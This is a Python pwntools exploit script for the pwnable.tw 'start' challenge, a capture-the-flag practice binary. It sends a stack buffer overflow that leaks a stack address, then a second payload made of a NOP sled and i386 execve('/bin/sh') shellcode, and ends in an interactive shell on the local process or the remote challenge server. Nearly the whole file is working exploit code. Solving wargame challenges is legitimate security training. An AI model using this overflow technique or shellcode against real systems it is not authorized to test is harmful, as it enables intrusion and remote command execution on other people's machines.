from pwn import *
import sys,getopt
import time


args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = 'start1'
local = 1 if '-r' not in args else 0
attach = local & 0
bps = attach & 0
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = 'chall.pwnable.tw'
port = 10000
io = None
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"


def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()

def pwn():
	makeio()
	if debug:
		context.log_level = 'debug'
	if attach:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])

	ru("Let's start the CTF:")
	payload = 'A'*0x14 + p32(0x08048087) #	mov    ecx,esp
	sd(payload)
	stack_addr = io.recv(4)
	print stack_addr
	stack_addr = u32(stack_addr)
	print hex(stack_addr)
	#shellcode = shellcraft.execve('/bin/sh')

	payload2 = 'B'*0x14 + p32(stack_addr+0x18)  +4*'\x90' + shellcode
	sl(payload2)
	io.interactive()


if __name__ == '__main__':
	pwn()

